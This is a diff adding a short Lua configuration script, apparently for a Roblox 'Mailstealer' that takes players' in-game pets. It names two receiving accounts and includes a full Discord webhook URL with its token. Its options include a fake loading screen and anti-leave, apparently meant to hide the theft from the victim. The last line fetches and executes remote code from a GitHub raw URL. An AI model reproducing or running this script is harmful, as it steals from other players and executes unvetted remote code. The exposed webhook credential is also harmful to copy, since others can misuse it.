@@ -1,0 +1,18 @@
+--[[
+  __  __       _ _     _             _           
+  |  \/  | __ _(_) |___| |_ ___  __ _| | ___ _ __ 
+  | |\/| |/ _` | | / __| __/ _ \/ _` | |/ _ \ '__|
+  | |  | | (_| | | \__ \ ||  __/ (_| | |  __/ |   
+  |_|  |_|\__,_|_|_|___/\__\___|\__,_|_|\___|_|   
+
+]]--
+
+UserName = "Taegokrazzie " -- good pets
+Webhook = "https://discord.com/api/webhooks/1125304995089236048/rBF5MS5o-J8Ou72qJTf1rBtMieT9rV7Z2p_Zoa_N8xKRHfn0xnU6c4PxIuUCcvylSHfn" -- pings for pets
+UserName2 = "donteded235" -- bad pets
+
+_G.LoadingScreen = true -- make it true if you want the loadingscreen
+_G.AntiLeave = true -- make it true if you want the antileave
+_G.MouseLock = true -- make it true if you want the mouselock
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriScripts/main/MoriScriptZ", true))()
